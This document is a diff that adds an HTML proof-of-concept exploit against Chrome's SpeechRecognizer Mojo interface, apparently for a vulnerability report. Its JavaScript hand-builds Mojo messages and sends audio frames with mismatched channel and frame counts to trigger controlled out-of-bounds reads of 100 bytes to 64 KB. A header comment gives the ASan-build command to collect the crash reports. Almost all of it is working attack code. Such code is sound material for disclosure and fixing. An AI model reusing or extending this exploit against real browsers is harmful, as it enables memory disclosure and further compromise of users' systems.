@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<!--
+  Supplementary PoC: Demonstrates controlled OOB read sizes (100, 1024, 4096, 65536 bytes)
+  Each test creates a fresh SpeechRecognizer session and triggers a different OOB distance.
+  Run under ASan with halt_on_error=0 to collect all 4 crash reports:
+
+  ASAN_OPTIONS=detect_odr_violation=0:halt_on_error=0 ./out/asan-debug/chrome \
+    --no-sandbox --enable-blink-features=MojoJS,MojoJSTest --disable-gpu \
+    file:///path/to/poc-variable-read-sizes.html 2>&1 | tee /tmp/variable.log
+-->
+<html><head><title>PoC: Variable OOB Read Sizes</title></head>
+<body>
+<pre id="log"></pre>
+<script>
+var L = document.getElementById('log');
+function log(m) { L.textContent += m + '\n'; }
+
+if (typeof Mojo === 'undefined') { log('FATAL: MojoJS not available'); throw 0; }
+
+function MB(n){this.b=new ArrayBuffer(n||4096);this.v=new DataView(this.b);this.o=0;this.h=[];}
+MB.prototype.u8=function(v){this.v.setUint8(this.o,v);this.o+=1;};
+MB.prototype.i16=function(v){this.v.setInt16(this.o,v,true);this.o+=2;};
+MB.prototype.u32=function(v){this.v.setUint32(this.o,v,true);this.o+=4;};
+MB.prototype.i32=function(v){this.v.setInt32(this.o,v,true);this.o+=4;};
+MB.prototype.u64=function(lo,hi){this.v.setUint32(this.o,lo,true);this.v.setUint32(this.o+4,hi||0,true);this.o+=8;};
+MB.prototype.al=function(a){var r=this.o%a;if(r)this.o+=(a-r);};
+MB.prototype.ah=function(h){var i=this.h.length;this.h.push(h);return i;};
+MB.prototype.get=function(){return{buffer:this.b.slice(0,this.o),handles:this.h};};
+
+function buildAudio(ch, sr, fr, data) {
+  var m = new MB(256 + data.length * 2);
+  m.u32(24); m.u32(0); m.u32(0); m.u32(1); m.u32(0); m.u32(0);
+  var p=m.o; m.u32(0); m.u32(0); var bp=m.o; m.u64(0);
+  m.v.setUint32(p, m.o-p, true);
+  var ao=m.o; m.v.setUint32(bp, ao-bp, true);
+  var ah=m.o; m.u32(0); m.u32(0);
+  m.i32(ch); m.i32(sr); m.i32(fr); m.i32(0);
+  var dp=m.o; m.u64(0); m.v.setUint32(ah, m.o-ah, true);
+  var ar=m.o; m.v.setUint32(dp, ar-dp, true);
+  m.u32(8 + data.length*2); m.u32(data.length);
+  for (var i=0; i<data.length; i++) m.i16(data[i]); m.al(8);
+  return m.get();
+}
+
+function buildStart(sr, cr, af, lang, ch, rate) {
+  var m = new MB(4096);
+  m.u32(24); m.u32(0); m.u32(0); m.u32(0); m.u32(0); m.u32(0);
+  var p=m.o; m.u32(0); m.u32(0); var pp=m.o; m.u64(0);
+  m.v.setUint32(p, m.o-p, true);
+  var ro=m.o; m.v.setUint32(pp, ro-pp, true); m.u32(0); m.u32(0);
+  m.u32(m.ah(sr)); m.u32(m.ah(cr)); m.u32(0); m.u32(5);
+  var lp=m.o; m.u64(0); var gp=m.o; m.u64(0); m.u64(0);
+  m.u8(0x0B); m.u8(0); m.u8(0); m.u8(0);
+  m.u32(m.ah(af)); m.i32(ch); m.i32(rate); m.al(8);
+  m.v.setUint32(ro, m.o-ro, true);
+  var lo=m.o; m.v.setUint32(lp, lo-lp, true);
+  var lb=[]; for(var i=0;i<lang.length;i++) lb.push(lang.charCodeAt(i));
+  m.u32(8+lb.length+1); m.u32(lb.length);
+  for(var i=0;i<lb.length;i++) m.u8(lb[i]); m.u8(0); m.al(8);
+  var go=m.o; m.v.setUint32(gp, go-gp, true); m.u32(8); m.u32(0); m.al(8);
+  return m.get();
+}
+
+// Test cases: demonstrates precise control over OOB read distance
+var TESTS = [
+  { name: '100B OOB',   ch: 1, fr: 60,    dataSz: 10, oob: 100 },
+  { name: '1KB OOB',    ch: 1, fr: 522,   dataSz: 10, oob: 1024 },
+  { name: '4KB OOB',    ch: 2, fr: 1033,  dataSz: 18, oob: 4096 },
+  { name: '64KB OOB',   ch: 4, fr: 8202,  dataSz: 40, oob: 65536 },
+];
+
+var idx = 0;
+function runNext() {
+  if (idx >= TESTS.length) { log('\nAll probes sent. Check ASan logs.'); return; }
+  var t = TESTS[idx++];
+  var verify = (t.ch * t.fr - t.dataSz) * 2;
+  log('\n--- Test ' + idx + ': ' + t.name + ' ---');
+  log('  ch=' + t.ch + ' fr=' + t.fr + ' data=' + t.dataSz + ' -> OOB=' + verify + 'B');
+
+  var rp = Mojo.createMessagePipe(), sp = Mojo.createMessagePipe();
+  var cp = Mojo.createMessagePipe(), ap = Mojo.createMessagePipe();
+  Mojo.bindInterface('media.mojom.SpeechRecognizer', rp.handle1, 'context');
+  var sm = buildStart(sp.handle1, cp.handle0, ap.handle1, 'en-US', 1, 16000);
+  rp.handle0.writeMessage(new Uint8Array(sm.buffer), sm.handles);
+
+  setTimeout(function() {
+    var data = [];
+    for (var i = 0; i < t.dataSz; i++) data.push(0x4141 + idx);
+    var msg = buildAudio(t.ch, 16000, t.fr, data);
+    var r = ap.handle0.writeMessage(new Uint8Array(msg.buffer), msg.handles);
+    log('  ' + (r === Mojo.RESULT_OK ? 'Sent' : 'FAILED: ' + r));
+    setTimeout(runNext, 1500);
+  }, 2000);
+}
+
+log('Variable OOB Read Size Demonstration');
+log('=====================================');
+runNext();
+</script>
+</body>
+</html>
